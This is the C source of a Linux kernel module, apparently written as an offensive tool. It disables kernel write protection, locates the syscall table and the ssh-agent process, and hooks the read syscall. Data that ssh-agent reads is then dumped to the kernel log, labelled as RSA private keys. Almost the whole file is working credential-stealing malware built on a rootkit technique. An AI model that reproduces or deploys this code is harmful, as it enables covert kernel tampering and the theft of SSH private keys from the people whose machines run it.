#include <linux/version.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kprobes.h>
#include <linux/mm.h>
#include <linux/sched/mm.h>
#include <linux/string.h>
#include <linux/license.h>
#include <asm/unistd.h>

long orig_cr0;

#define unprotect_memory() \
({ \
        orig_cr0 =  read_cr0();\
        write_cr0(orig_cr0 & (~ 0x10000)); /* Set WP flag to 0 */ \
});

#define protect_memory() \
({ \
        write_cr0(orig_cr0); /* Set WP flag to 1 */ \
});

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
    #define PTREGS_SYSCALL_STUBS    1
#endif

// if we need to call kallsyms_lookup_name from outside get_syscall_table()
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
#endif

struct task_struct *ssh_agent_task;

// HOOKS
#if PTREGS_SYSCALL_STUBS
static asmlinkage ssize_t (*orig_read)(const struct pt_regs*);

asmlinkage ssize_t 
hook_read(const struct pt_regs *regs)
{
    ssize_t ret;
    char __user *buf, *kbuf, *displayBuffHex, *displayBuffChar;
    size_t count;
    long len, i;
    char tmp[4];

    ret = orig_read(regs);
    if (ssh_agent_task && ssh_agent_task == get_current() && ret > 5)
    {
        printk(KERN_INFO "0x%x %d\n", ssh_agent_task, ret);
        buf = (char*) regs->si;
        count = (size_t) regs->dx;
        kbuf = kzalloc(ret + 1, GFP_KERNEL);
        displayBuffHex = kzalloc((ret*3)+1, GFP_KERNEL);
        displayBuffChar = kzalloc(ret+1, GFP_KERNEL);
        if (kbuf)
        {
            if ((len = copy_from_user(kbuf, buf, ret)) > 0)
                printk(KERN_ERR "Couldn't copy %ld bytes from user space\n", len);
            
            for(i=0; i<ret; i++)
            {
                if (i == ret-1 || (i+1)%10 == 0)
                    snprintf(tmp, sizeof tmp-1, "%02x\n", kbuf[i]);
                else
                    snprintf(tmp, sizeof tmp-1, "%02x ", kbuf[i]);
                strcat(displayBuffHex, tmp);
                if (kbuf[i] != 0)
                {
                    if (i == ret-1)
                        snprintf(tmp, sizeof tmp-1, "%c\n", kbuf[i]);
                    else
                        snprintf(tmp, sizeof tmp-1, "%c", kbuf[i]);
                }
                strcat(displayBuffChar, tmp);
            }

            printk(KERN_INFO "Dumped rsa private key:\n%s\n", displayBuffHex);
            printk(KERN_INFO "Dumped rsa private key:\n%s\n", displayBuffChar);

            kfree(kbuf);
            kfree(displayBuffHex);
            kfree(displayBuffChar);
        }
    }
    return ret;
}


#else

#endif


static unsigned long *
get_syscall_table(void)
{
    unsigned long *staddr;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif

    staddr = kallsyms_lookup_name("sys_call_table");

    return staddr;
}

static struct task_struct*
retrieve_ssh_agent(void)
{
    struct task_struct *task, *ssh_agent;

    for_each_process(task) 
    {
        if (strcmp(task->comm + strlen(task->comm) - strlen("ssh-agent"), "ssh-agent") == 0         // compare with string end of comm
            && strlen(task->comm) != 0)
        {
            ssh_agent = task;
            break;
        }
    }

    return ssh_agent;
}

unsigned long *syscall_table;
static int __init 
modinit(void)
{

    // retrieve sys_call_table 
    syscall_table = get_syscall_table();
    if (!syscall_table)
    {
        printk (KERN_ERR "Cannot retrieve sys_call_table address\n");
        return -1;
    }

    // retrieve ssh-agent process
    ssh_agent_task = retrieve_ssh_agent();
    if (!ssh_agent_task)
    {
        printk(KERN_ERR "Cannot retrieve ssh-agent process (struct tast_struct*)\n");
        return -1;
    }


    // install hooks
    orig_read = syscall_table[__NR_read];

    unprotect_memory();
    syscall_table[__NR_read] = hook_read;
    protect_memory();

    printk(KERN_INFO "ssh-agent retrieved and hooks installed !\n");

    return 0;
}

static void __exit
modexit(void)
{
    // uninstall hooks
    unprotect_memory();
    syscall_table[__NR_read] = orig_read;
    protect_memory();
    printk(KERN_INFO "hooks removed !\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("yocvito");

module_init(modinit);
module_exit(modexit);